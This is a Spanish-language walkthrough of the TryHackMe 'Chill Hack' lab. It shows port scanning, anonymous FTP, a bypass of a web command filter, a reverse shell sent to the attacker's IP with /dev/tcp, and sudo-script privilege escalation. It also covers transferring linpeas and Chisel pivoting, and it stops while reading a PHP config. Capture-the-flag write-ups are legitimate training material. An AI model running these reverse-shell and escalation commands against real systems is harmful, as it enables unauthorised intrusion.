---
title: Write-Up Chill Hack
description: Write-Up sobre la máquina Chill Hack de TryHackMe
published: false
date: 2025-01-24T15:03:36.280Z
tags: tryhackme
editor: markdown
dateCreated: 2025-01-24T11:20:08.121Z
---

# Write Up
Bienvenido a mi Write Up de la máquina [Chill Hack de TryHackMe](https://tryhackme.com/r/room/chillhack). Esta máquina es considerada facil y se puede hacer en unos 45 minutos.
## Preparación
Lo primero que haremos será abrir el archivo de VPN otorgado por TryHackme, y le haremos un ping a la ip de la máquina que nos han dado
![imagen_hacking_chill-hack_1ping.png](/imagen_hacking_chill-hack_1ping.png)
> La IP de las máquinas son: KALI(10.9.3.9), THM(10.10.38.123)
{.is-info}

## Escaneo y primer vistazo
Una vez comprobado que no hay problemas con el ping, haremos un escaneo de puertos para observar que podemos ver. Para ello hacemos un 
``` bash
nmap -sT -Pn -sV 10.10.38.123
```
![imagen_hacking_chill-hack_2nmap.png](/imagen_hacking_chill-hack_2nmap.png)

Como podemos observartenemos los siguientes puertos abiertos:
- 21: FTP -> Servidor FTP
- 22: SSH -> Para conexiones remotas
- 80: HTTP -> Para servicio web

Debido a que no tenemos credenciales de SSH, vamos a probar primero con los otros dos servicios.
### HTTP
Si nos dirigmos a nuestro navegador y ponemos la IP de nuestra máquina, podemos cargar un servicio web donde parece ser que son cosas de deporte.
![imagen_hacking_chill-hack_3website.png](/imagen_hacking_chill-hack_3website.png)

Podemos hacer un **dirb**, para analizar todos los subdirectorios que tiene.
``` bash
dirb http://10.10.38.123
```
![imagen_hacking_chill-hack_10dirb1.png](/imagen_hacking_chill-hack_10dirb1.png)
![imagen_hacking_chill-hack_11dirb2.png](/imagen_hacking_chill-hack_11dirb2.png)
Como observamos, hemos encontrado un directorio llamado *secret*, que dentro un index.html, asi que vamos a mirar que es.
![imagen_hacking_chill-hack_4secret.png](/imagen_hacking_chill-hack_4secret.png)

Una vez dentro, observamos lo que parece ser una terminal, por lo que vamos a poner comandos simples como 
``` bash
whoami
```
Como podemos ver, nuestra página ha cambiado, nos ha devuelto el comando y ahora parece ser que hay un gif.
![imagen_hacking_chill-hack_5comandobueno.png](/imagen_hacking_chill-hack_5comandobueno.png)

Vamos a intentar crear una shell reversa, recomiendo el uso de [RevShell](https://www.revshells.com).
En mi máquina Kali vamos a poner
```bash
nc -lnvp 9000
```
![imagen_hacking_chill-hack_6shellkali.png](/imagen_hacking_chill-hack_6shellkali.png)
Y en la consola de la página vamos a poner:
```bash
sh -i >& /dev/tcp/10.9.3.9/9000 0>&1
```
Lamentablemente, parece que el comando no ha funcionado. Volveremos a esto más adelante, antes vamos a ir al servidor FTP
![imagen_hacking_chill-hack_7comandomalo.png](/imagen_hacking_chill-hack_7comandomalo.png)
### Servidor FTP
Nos conectamos al servidor con el usuario *anonymous* y sin contraseña.
```bash
ftp 10.10.38.123
```
![imagen_hacking_chill-hack_8ftp.png](/imagen_hacking_chill-hack_8ftp.png)

Haciendo el comando **dir**, podemos listar todo lo que hay y nos podemos encontrar un archivo llamado *note.txt*. Los comandos que hemos puesto ahora son:
``` ftp
dir
get note.txt
```
![imagen_hacking_chill-hack_9get.png](/imagen_hacking_chill-hack_9get.png)

Una vez descargado el archivo, vamos a comprobar lo que hay en el documento.
![imagen_hacking_chill-hack_12note.png](/imagen_hacking_chill-hack_12note.png)
El documento nos dice que un usuario llamado *Anurodh*, ha creado un filtro de comandos, esto está firmado por otro usuario llamado *Apaar*.

Volvamos al HTTP e intentemos entrar, comienzando la fase de **Intrusión**
## Intrusión
Ahora nos queda intentar entrar en el equipo. Para ello se ha intentado varias formas, como puede ser:
1. Subir un archivo con un script que contemple "sh -i >& /dev/tcp/10.9.3.9/9000 0>&1" y se ejecute
2. Intentar introducir caracteres especiales entre el comando
3. Dirigirnos directamente a la ruta de la ejecución del comando, que es lo que se hizo en este caso.

Por lo tanto, dentro de la página web vamos a escribir:
```bash
/bin/bash -i >& /dev/tcp/10.9.3.9/9000 0>&1
```

Una vez escrito esto podemos observar como hemos entrado sin problema.
![imagen_hacking_chill-hack_13intrusion.png](/imagen_hacking_chill-hack_13intrusion.png)
> Recordad que debemos mantener una shell con "nc -lnvp 9000"
{.is-info}

Una vez tengamos acceso, podemos empezar a ejecutar comandos para intentar escalar privilegios.
## Escalada de privilegios y búsqueda de flags
### WWW-DATA
Como podemos observar, somos el usuario www-data, usuario creado para interpretar website, recomiendo echar un ojo a el **directorio** en el que estamos, ya que nos será más util después.

Lo primero que haremos será securizar la shell, para ello vamos a poner los siguientes comandos:
```bash
python3 -c "import pty;pty.spawn('/bin/bash')"
```
Tras esto hacemos <kbd>CTRL</kbd> + <kbd>Z</kbd>.
Y escribimos los siguientes comandos:
```
stty raw -echo;
export TERM=xterm
```

Ya tendremos la shell lista. Podemos analizar el contenido del index, para saber porque no podiamos escribir bien los comandos
![imagen_hacking_chill-hack_15website.png](/imagen_hacking_chill-hack_15website.png)
Como podemos observar, es debido a que hay una blacklist de comandos, para dificultarnos uso de la misma.
Ahora lo que vamos a intentar es escalar privilegios como www-data, para ello podemos intentar los comandos:
- id: Mirar los grupos a los que pertenece nuestro usuario.
- sudo -l: Para comprobar los privilegios que tenemos.

Si intentamos el id, no encontraremos nada importante, sin embargo con sudo -l, hemos encontrado que tenemos privilegios en un archivo llamado **.helpline.sh**, que está en la ruta **home** del usuario **apaar**
![imagen_hacking_chill-hack_16privilegios.png](/imagen_hacking_chill-hack_16privilegios.png)

Vamos a ver de que se trata este script.
```
cat /home/apaar/.helpline.sh
```
![imagen_hacking_chill-hack_17script.png](/imagen_hacking_chill-hack_17catscript.png)
Como podemos observar es done nos pregunta un nombre, y después enviar un mensaje. Sin embargo este mensaje se envia a una terminal, por lo que podriamos intentar acceder al usuario apaar.
> Esto es debido a que podemos ejecutar el comando como si fueramos apaar, como se vio anteriormente.
{.is-info}

Primero hacemos una prueba
![imagen_hacking_chill_18scriptejecutado.png](/imagen_hacking_chill-hack_18scriptejecutado.png)

Como podemos ver en la terminal, nos devuelve apaar, por lo que podriamos intentar acceder como este usuario, para poder tener una shell como apaar, vamos a poner en el apartado de mensaje /bin/bash.
![imagen_hacking_chill-hack_19scriptdentro.png](/imagen_hacking_chill-hack_19scriptdentro.png)

### Apaar
Ya somos apaar, haremos lo mismo. Comprobaremos tanto *id* como *sudo -l*, lamentablemente no tenemos nada interante para continuar.
![imagen_hacking_chill-hack_31permisosapaar.png](/imagen_hacking_chill-hack_31permisosapaar.png)

Podemos comprobar si vemos algo en el home del usuario para ello hacemos
```bash
cd 
ls
```

Podemos encontrar un txt llamado local, el cual si lo leemos con un cat, podremos obtener la primera flag.
![imagen_hacking_chill-hack_20primeraflag.png](/imagen_hacking_chill-hack_20primeraflag.png)

> En este punto yo estaba en punto muerto, por lo que se ha intentado continuar siguiendo algunos write-up y se recomienda el uso de Linpeas
{.is-danger}

> Linpeas es un software de escaneo de vulnerabilidades y no se recomiendo bajo ninguna circunstancia el uso de esta herramienta para otra cosa que no sea hackeo ético y con el previo permiso del dueño del equipo.

Debido a que no tenemos forma ninguna de continuar, vamos a intentar usar una herramienta llamada Linpeas, que nos permitirá encontrar vulnerabilidades en el sistema.
Nos descargamos linepas del github oficial: [Linpeas](https://github.com/peass-ng/PEASS-ng/tree/master). Nos vamos a descargar el [Linpeas.sh]()

Una vez descargado, vamos a abrir un pequeño servicio web, para que el equipo de TryHackMe lo descargue.
```python
python -m http.server 8000
```
> Ubicar linpeas en la misma carpeta donde abris el servicio web.
{.is-warning}

![imagen_hacking_chill-hack_21pasarlinpeas.png](/imagen_hacking_chill-hack_21pasarlinpeas.png)

En nuestra shell, vamos a escribir lo siguiente:
```sh
wget http://10.9.3.9:8000/linpeas.sh
```
![imagen_hacking_chill-hack_22obtenerlinpeas.png](/imagen_hacking_chill-hack_22obtenerlinpeas.png)
Una vez lo descargamos, le damos permisos de ejecución y lo ejecutamos
```bash
chmod +x linpeas.sh
./linpeas.sh
```

Si dejamos que Linpeas analicé todo, vamos a encontrar que hay un puerto activo en 127.0.0.1:9001, es decir solo puede entrar por si mismo, también del puerto 3306 que es MySQL
![imagen_hacking_chill-hack_24informacion_limpeas.png](/imagen_hacking_chill-hack_24informacion_limpeas.png)

Vamos a intentar acceder a el, para ello usaremos la herramienta Chisel
> Ir a la práctica de pivotaje para descargar Chisel y la configuración de los proychains5 [enlace](https://ciberapuntes.com/es/apuntes/ciber/Hacking_Etico/Pivotaje)
{.is-info}

Una vez descargado, vamos a hacer el mismo proceso que hicimos para pasar linpeas, por lo que abrimos de nuevo el servicio web
```python
python -m http.server 8000
```
> Si diera error el puerto 8000, cambiar de puerto, o asegurarse que están todos los procesos termiando con dicho puerto.
{.is-warning}

Tras haberlo descargado e dado los permisos de ejecución, vamos a ejecutarlo.
En nuestra máquina Kali, vamos a poner el siguiente comando
```bash
./chisel server -p 4000 --reverse --socks5
```
![imagen_hacking_chill-hack_27chisel_kali.png](/imagen_hacking_chill-hack_27chisel_kali.png)
Y en la máquina de TryHackMe, vamos a poner lo siguiente:
```bash
./chisel client 10.9.3.9:4000 R:9001:127.0.0.1:9001
```
![imagen_hacking_chill-hack_28chisel_thm.png](/imagen_hacking_chill-hack_28chisel_thm.png)

Teniendo el proxy activado, si acudimos a nuestro navegador y ponemos *127.0.0.1:9001*, podemos ver lo siguiente:
![imagen_hacking_chill-hack_29websitelocalhost.png](/imagen_hacking_chill-hack_29websitelocalhost.png)

No tenemos ningúna de las credenciales, por lo que deberemos volver atrás. Esto nos hace preguntar, ¿Dondé están los archivos de este servicio web?.

Recordamos que los archivos del primer servicio web estába en /var/www/html, sin embargo, normalmente solo hace falta que esté en /var/www, para que se pueda ver. Por lo que hay algo raro.
Si hacemos un ls a la carpeta /var/www, podemos ver lo siguiente
```bash
ls /var/www
```

![imagen_hacking_chill-hack_30websites.png](/imagen_hacking_chill-hack_30websites.png)

Tenemos una carpeta llamada files, si hacemos un ls a está carpeta podemos encontrar más cosas interesantes.
```bash
cd /var/www/files
ls
```
![imagen_hacking_chill-hack_32lsfiles.png](/imagen_hacking_chill-hack_32lsfiles.png)

Tenemos el index, en formato php, es posible que tenga almacenada las credenciales de acceso.

Hacemos por lo tanto un:
```bash
cat index.php
```
![imagen_hacking_chill-hack_33indexfiles.png](/imagen_hacking_chill-hack_33indexfiles.png)
Como observamos en la imagen, tenemos una conexión con una base de datos llamada **webportal**